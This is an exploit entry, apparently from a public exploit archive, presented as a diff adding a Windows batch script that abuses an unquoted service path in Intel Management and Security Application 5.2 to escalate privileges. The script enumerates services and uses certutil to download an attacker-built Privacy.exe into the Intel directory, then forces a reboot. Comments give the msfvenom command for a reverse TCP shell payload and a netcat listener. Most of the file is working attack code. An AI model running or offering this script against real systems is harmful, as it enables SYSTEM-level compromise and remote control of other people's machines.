@@ -1,0 +1,44 @@
+# Exploit Title: Intel(r) Management and Security Application 5.2 - User Notification Service Unquoted Service Path
+# Date: 2020-08-28
+# Exploit Author: Metin Yunus Kandemir
+# Vendor Homepage: https://www.intel.com/
+# Version: v5.2
+# Tested on: Windows 7
+# Source: https://www.totalpentest.com/post/intel-r-user-notification-service-unquoted-service-path-privilege-escalation
+
+@ECHO OFF
+ECHO
+=======================================================================================================================
+ECHO INTEL(R) MANAGEMENT AND SECURITY APPLICATION USER NOTIFICATION SERVICE 5.2 - Unquoted Service Path Privilege Escalation
+ECHO
+=======================================================================================================================
+ECHO [+] executing command: "wmic service get name,pathname,displayname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """"
+wmic service get name,pathname,displayname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+sc qc UNS
+ECHO [+] Your mandoroty level is:
+whoami /groups | findstr /B /C:"Mandatory Label"
+::Create Privacy.exe with following commands on your kali and serve it on port 80. Also listen port 443 with netcat for reverse shell.
+::msfvenom -p windows/shell/reverse_tcp LHOST=<Your IP Address> LPORT=443 -f exe > Privacy.exe
+ECHO [?]
+ECHO [+] Enumeration was completed successfully.
+ECHO [?] If you create Privacy.exe under Intel directory with your privileges, you might be able to get SYSTEM reverse shell after windows was rebooted.
+PAUSE
+certutil -urlcache -split -f http://<YOUR_IP_ADDRESS>/Privacy.exe "C:\Program Files (x86)\Common Files\Intel\Privacy.exe"
+IF EXIST "C:\Program Files (x86)\Common Files\Intel\Privacy.exe" (
+  ECHO [+] The download was successful.
+) ELSE (
+  ECHO [-] The download was unsuccessful.
+  PAUSE
+)
+ECHO [!] If you continue, system will reboot.
+PAUSE
+shutdown /r /t 0
+::code end
+
+#Exploit:
+
+A successful attempt would require the local user to be able to insert
+their code in the system root path undetected by the OS or other security
+applications where it could potentially be executed during application
+startup or reboot. If successful, the local user's code would execute with
+the elevated privileges of the application.
